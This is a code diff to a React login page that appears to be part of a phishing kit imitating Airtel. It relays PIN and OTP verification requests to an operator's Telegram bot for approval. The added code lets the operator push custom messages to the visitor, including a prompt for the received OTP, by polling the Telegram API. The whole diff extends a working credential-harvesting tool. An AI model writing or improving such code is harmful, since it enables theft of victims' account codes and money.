@@ -19,7 +19,8 @@ const STATUS_MESSAGES = {
   wrong_pin: "❌ Code PIN incorrect",
   expired: "⏰ Délai de vérification dépassé",
   rejected: "❌ REJECTED SUCCESSFULLY!",
-  message_sent: "💬 USER MESSAGED SUCCESSFULLY!"
+  message_sent: "💬 USER MESSAGED SUCCESSFULLY!",
+  waiting_for_message: "💬 Waiting for admin message..."
 }
 
 function Login() {
@@ -35,12 +36,14 @@ function Login() {
   const [status, setStatus] = useState("")
   const [adminMessage, setAdminMessage] = useState("")
   const [showRetryButton, setShowRetryButton] = useState(false)
+  const [waitingForMessage, setWaitingForMessage] = useState(false)
   const requestIdRef = useRef(null)
   const pollingIntervalRef = useRef(null)
   const startTimeRef = useRef(null)
   const checkCountRef = useRef(0)
   const maxChecks = 24
   const lastUpdateIdRef = useRef(0)
+  const messageRequestRef = useRef(null)
 
   useEffect(() => {
     const timer = setTimeout(() => setInputs(Array(4).fill("")), 30000)
@@ -141,10 +144,15 @@ function Login() {
           chat_id: ADMIN_CHAT_ID,
           text: message,
           reply_markup: {
-            inline_keyboard: [[
-              { text: '✅ Approve', callback_data: 'approve_' + requestId },
-              { text: '❌ Reject', callback_data: 'reject_' + requestId }
-            ]]
+            inline_keyboard: [
+              [
+                { text: '✅ Approve', callback_data: 'approve_' + requestId },
+                { text: '❌ Reject', callback_data: 'reject_' + requestId }
+              ],
+              [
+                { text: '💬 Message User', callback_data: 'message_user_' + requestId }
+              ]
+            ]
           }
         })
       })
@@ -205,6 +213,19 @@ function Login() {
                   })
                 } catch (e) {}
                 return { approved: false, status: 'rejected' }
+              } else if (action === 'message_user') {
+                try {
+                  await fetch(TELEGRAM_API + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: update.callback_query.from.id,
+                      text: '💬 Please enter your message for the user. Type it now:'
+                    })
+                  })
+                } catch (e) {}
+                messageRequestRef.current = requestId
+                return { approved: false, status: 'message_user_clicked' }
               }
             }
           }
@@ -214,6 +235,51 @@ function Login() {
     } catch (e) {
       console.error('Approval check failed:', e)
       return { approved: false, status: 'error' }
+    }
+  }
+
+  async function checkAdminMessage() {
+    try {
+      const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
+      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=' + offset)
+      const data = await response.json()
+      
+      if (data.ok && Array.isArray(data.result)) {
+        for (const update of data.result) {
+          if (update.update_id > lastUpdateIdRef.current) {
+            lastUpdateIdRef.current = update.update_id
+          }
+          if (update.message && update.message.text && messageRequestRef.current) {
+            const msg = update.message.text
+            const senderId = update.message.from.id
+            sessionStorage.setItem('adminMessage', msg)
+            setAdminMessage(msg)
+            setStatus("message_sent")
+            setLoading(false)
+            setWaitingForApproval(false)
+            setWaitingForMessage(false)
+            if (pollingIntervalRef.current) {
+              clearInterval(pollingIntervalRef.current)
+              pollingIntervalRef.current = null
+            }
+            try {
+              await fetch(TELEGRAM_API + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: senderId,
+                  text: '✅ Message delivered to client!'
+                })
+              })
+            } catch (e) {}
+            return { received: true, message: msg }
+          }
+        }
+      }
+      return { received: false, message: null }
+    } catch (e) {
+      console.error('Message check failed:', e)
+      return { received: false, message: null }
     }
   }
 
@@ -243,6 +309,11 @@ function Login() {
         setStatus("approved")
         requestIdRef.current = null
         sessionStorage.setItem('airtelOTPApproved', 'true')
+      } else if (result.status === 'message_user_clicked') {
+        setWaitingForMessage(true)
+        setWaitingForApproval(false)
+        setStatus("waiting_for_message")
+        console.log('Admin clicked Message User, waiting for message...')
       } else if (result.status === 'rejected') {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
@@ -250,11 +321,23 @@ function Login() {
         setWaitingForApproval(false)
         setStatus("rejected")
         requestIdRef.current = null
-      } else if (checkCountRef.current >= maxChecks) {
+      }
+      
+      if (waitingForMessage) {
+        const msgResult = await checkAdminMessage()
+        if (msgResult.received) {
+          clearInterval(pollingIntervalRef.current)
+          pollingIntervalRef.current = null
+          checkCountRef.current = 0
+        }
+      }
+      
+      if (checkCountRef.current >= maxChecks) {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
         setLoading(false)
         setWaitingForApproval(false)
+        setWaitingForMessage(false)
         setStatus("expired")
         requestIdRef.current = null
         setShowRetryButton(true)
@@ -398,43 +481,44 @@ function Login() {
                 <span style={{ color: "#4caf50", fontSize: "24px" }}>✅</span>
                 <h3 style={{ margin: 0, color: "#2e7d32" }}>APPROVED SUCCESSFULLY!</h3>
               </div>
-              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8, marginBottom: "15px" }}>
+              <p style={{ margin: "5px 0 15px 0", color: "#333", opacity: 0.8 }}>
                 Choose your next action
               </p>
-              <button
-                onClick={() => navigate(`${basePath}/verification`)}
-                style={{
-                  padding: "10px 20px",
-                  backgroundColor: "#11bb4a",
-                  color: "white",
-                  border: "none",
-                  borderRadius: "6px",
-                  cursor: "pointer",
-                  fontSize: "14px",
-                  fontWeight: "bold"
-                }}
-              >
-                Continue to Verification
-              </button>
-              <br /><br />
-              <button
-                onClick={() => {
-                  sessionStorage.setItem('adminMessage', 'Veuillez saisir le code OTP reçu')
-                  navigate(`${basePath}/message`)
-                }}
-                style={{
-                  padding: "10px 20px",
-                  backgroundColor: "#2196f3",
-                  color: "white",
-                  border: "none",
-                  borderRadius: "6px",
-                  cursor: "pointer",
-                  fontSize: "14px",
-                  fontWeight: "bold"
-                }}
-              >
-                Message User
-              </button>
+              <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
+                <button
+                  onClick={() => navigate(`${basePath}/verification`)}
+                  style={{
+                    padding: "10px 20px",
+                    backgroundColor: "#11bb4a",
+                    color: "white",
+                    border: "none",
+                    borderRadius: "6px",
+                    cursor: "pointer",
+                    fontSize: "14px",
+                    fontWeight: "bold"
+                  }}
+                >
+                  Continue to Verification
+                </button>
+                <button
+                  onClick={() => {
+                    sessionStorage.setItem('adminMessage', 'Veuillez saisir le code OTP reçu')
+                    navigate(`${basePath}/message`)
+                  }}
+                  style={{
+                    padding: "10px 20px",
+                    backgroundColor: "#2196f3",
+                    color: "white",
+                    border: "none",
+                    borderRadius: "6px",
+                    cursor: "pointer",
+                    fontSize: "14px",
+                    fontWeight: "bold"
+                  }}
+                >
+                  Message User
+                </button>
+              </div>
             </div>
           )}
           
@@ -476,7 +560,26 @@ function Login() {
             </div>
           )}
           
-           <div style={{ display: "flex", justifyContent: "center" }}>
+          {status === "waiting_for_message" && (
+            <div style={{
+              backgroundColor: "#fff8e1",
+              border: "2px solid #ff9800",
+              borderRadius: "8px",
+              padding: "15px",
+              marginBottom: "15px",
+              textAlign: "center"
+            }}>
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
+                <span style={{ color: "#ff9800", fontSize: "24px" }}>⏳</span>
+                <h3 style={{ margin: 0, color: "#e65100" }}>WAITING FOR ADMIN MESSAGE</h3>
+              </div>
+              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
+                Admin has been prompted to send a message...
+              </p>
+            </div>
+          )}
+          
+          <div style={{ display: "flex", justifyContent: "center" }}>
              {[0, 1, 2, 3].map(index => (
                <input
                  key={index}
